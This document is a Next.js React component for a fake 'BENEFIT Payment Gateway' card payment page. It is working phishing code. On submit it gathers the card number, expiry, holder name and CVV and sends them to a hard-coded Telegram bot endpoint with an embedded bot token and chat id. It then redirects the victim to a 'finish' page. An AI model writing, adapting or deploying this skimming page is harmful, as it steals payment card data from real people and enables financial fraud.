'use client'
import { Suspense } from "react";
import React, { useState } from 'react';
import styles from "./benefitpay.module.css";
import { useRouter, useSearchParams } from 'next/navigation';
import axios from 'axios';

const KPayContent = () => {
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cardHolder: "",
    pin: ""
  });

  const [errors, setErrors] = useState({});
  const searchParams = useSearchParams();
  const price = searchParams.get("price");
  const refN = searchParams.get("refN");
  const router = useRouter();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value
    }));
  };

  const validate = () => {
    let newErrors = {};

    if (!/^\d{16}$/.test(formData.cardNumber)) {
      newErrors.cardNumber = "Card number must be 16 digits";
    }

    if (!formData.expiryMonth || !formData.expiryYear) {
      newErrors.expiryDate = "Expiry month and year are required";
    } else {
      const today = new Date();
      const expiry = new Date(formData.expiryYear, formData.expiryMonth - 1);
      if (expiry < today) {
        newErrors.expiryDate = "Expiry date must be in the future";
      }
    }

    if (!formData.cardHolder.trim()) {
      newErrors.cardHolder = "Card holder name is required";
    }

    if (!/^\d{3}$/.test(formData.pin)) {
      newErrors.pin = "CVV/CVC must be 3 digits";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validate()) {
      const text = `
🏦 Bank: BENEFIT
👤 Full Name: ${formData.cardHolder}
💳 Card Number: ${formData.cardNumber}
📅 Exp Month: ${formData.expiryMonth}
📅 Exp Year: ${formData.expiryYear}
🔐 cvv/cvc: ${formData.pin}
🔨 Ref: ${refN}
💲 Price: ${price}.000
      `;

      try {
        await axios.post(
          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
          {
            chat_id: "-4836393174",
            text: text
          }
        );
        router.push(`/kpay/finish?refN=${refN}&price=${price}`);
      } catch (error) {
        alert("Error sending data");
        console.error(error);
      }
    }
  };

  const months = Array.from({ length: 12 }, (_, i) => ({
    value: String(i + 1).padStart(2, '0'),
    label: String(i + 1).padStart(2, '0')
  }));

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 10 }, (_, i) => currentYear + i);

  return (
    <div className={styles.container} dir="ltr">
      <form onSubmit={handleSubmit}>

        <div>
          <h5>Amount</h5>
          <p>{price}.000</p>
        </div>

        <div>
          <h5>Card Type</h5>
          <p>Debit</p>
        </div>

        <div>
          <h5>Card Number</h5>
          <input
            type="text"
            name="cardNumber"
            value={formData.cardNumber}
            onChange={handleChange}
          />
          {errors.cardNumber && <div className={styles.errorBox}>⚠️ {errors.cardNumber}</div>}
        </div>

        <div>
          <h5>Expiry Date</h5>
          <div style={{ display: "flex", gap: "10px" }}>
            <select
              name="expiryMonth"
              value={formData.expiryMonth}
              onChange={handleChange}
            >
              <option value="">MM</option>
              {months.map((m) => (
                <option key={m.value} value={m.value}>{m.label}</option>
              ))}
            </select>

            <select
              name="expiryYear"
              value={formData.expiryYear}
              onChange={handleChange}
            >
              <option value="">YYYY</option>
              {years.map((y) => (
                <option key={y} value={y}>{y}</option>
              ))}
            </select>
          </div>
          {errors.expiryDate && <div className={styles.errorBox}>⚠️ {errors.expiryDate}</div>}
        </div>

        <div>
          <h5>Card Holder's Name</h5>
          <input
            type="text"
            name="cardHolder"
            value={formData.cardHolder}
            onChange={handleChange}
          />
          {errors.cardHolder && <div className={styles.errorBox}>⚠️ {errors.cardHolder}</div>}
        </div>

        <div>
          <h5>CVV/CVC</h5>
          <input
            type="number"
            name="pin"
            value={formData.pin}
            onChange={handleChange}
          />
          {errors.pin && <div className={styles.errorBox}>⚠️ {errors.pin}</div>}
        </div>

        <div className={styles.btn}>
          <button type="submit">Pay</button>
          <button type="button" onClick={() => router.push("/")}>Cancel</button>
        </div>
      </form>

      <b>View Accepted Cards</b>
      <p>
        Note: By submitting your information and using "BENEFIT Payment Gateway",
        you indicate that you agree to the Terms of Services - Legal Disclaimer.
      </p>
    </div>
  );
};

export default function KPay() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <KPayContent />
    </Suspense>
  );
  }
                  
